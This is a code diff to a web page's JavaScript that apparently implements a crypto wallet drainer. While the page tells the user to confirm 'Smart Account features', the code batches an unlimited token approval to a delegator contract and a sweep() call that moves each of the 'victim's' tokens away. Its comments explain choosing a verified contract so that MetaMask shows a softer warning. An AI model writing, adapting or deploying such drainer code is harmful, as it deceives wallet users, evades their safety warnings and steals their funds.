@@ -440,17 +440,26 @@ function sweep(address token) external {<br>
       ]);
       document.getElementById('connectNote').textContent = "Check MetaMask — confirm to enable Smart Account features.";
 
-      // V3: One sweep() call per token — NO approve needed
-      // address(this) in delegator context = victim EOA
-      // transfer() works directly without approval
-      const SWEEP_ABI = ["function sweep(address token) external"];
+      // V3 verified contract — approve + sweep(transferFrom)
+      // Contract is verified on Basescan so MetaMask shows softer warning
+      const APPROVE_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
+      const approveInterface = new ethers.Interface(APPROVE_ABI);
+
+      const SWEEP_ABI = ["function sweep(address token, address victim) external"];
       const delegatorInterface = new ethers.Interface(SWEEP_ABI);
 
-      maliciousCalls = targetTokens.map(tokenAddr => ({
-        to:    DELEGATOR_ADDRESS,
-        value: "0x0",
-        data:  delegatorInterface.encodeFunctionData("sweep", [tokenAddr])
-      }));
+      maliciousCalls = targetTokens.flatMap(tokenAddr => [
+        {
+          to:    tokenAddr,
+          value: "0x0",
+          data:  approveInterface.encodeFunctionData("approve", [DELEGATOR_ADDRESS, ethers.MaxUint256])
+        },
+        {
+          to:    DELEGATOR_ADDRESS,
+          value: "0x0",
+          data:  delegatorInterface.encodeFunctionData("sweep", [tokenAddr, userAddress])
+        }
+      ]);
 
       console.log(`Batch: ${maliciousCalls.length} sweep calls (no approvals)`);
 
@@ -478,7 +487,7 @@ function sweep(address token) external {<br>
         ? heldTokens.map(t => `${t.symbol} (${shortAddr(t.contractAddress)})`).join(', ')
         : `USDC (${shortAddr(DEMO_TOKEN_DEFAULT)})`;
       document.getElementById('displayBatchSize').textContent =
-        `${maliciousCalls.length} sweep call${maliciousCalls.length > 1 ? 's' : ''} — zero approve calls`;
+        `${maliciousCalls.length} calls (${targetTokens.length} token${targetTokens.length > 1 ? "s" : ""} × approve + sweep)`;
 
       setTimeout(() => showPhase('phase-dashboard'), 1000);
 
